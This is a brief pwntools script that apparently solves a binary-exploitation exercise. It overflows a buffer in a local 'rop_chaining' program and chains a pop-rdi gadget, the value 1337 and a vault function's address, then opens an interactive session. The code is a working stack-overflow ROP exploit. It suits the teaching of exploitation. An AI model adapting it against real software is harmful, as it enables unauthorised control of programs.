#!/usr/bin/env python3

from pwn import *

import argparse


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')

    args = parser.parse_args()

    POP_EDI_GADGET_ADDR = 0x0000000000401253
    ACCESS_VAULT_FUNCTION_ADDR = 0x0000000000401176

    elf = context.binary = ELF('rop_chaining')

    if args.debug:
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    else:
        io = process()  # Actually start running the process

    io.recvuntil(b"Enter the password to access Santa Ono's secret vault:")

    payload = (b'A' * 0x10 + b'B' * 0x8 +
               p64(POP_EDI_GADGET_ADDR) + p64(1337) + p64(ACCESS_VAULT_FUNCTION_ADDR))

    io.send(payload)

    io.interactive()
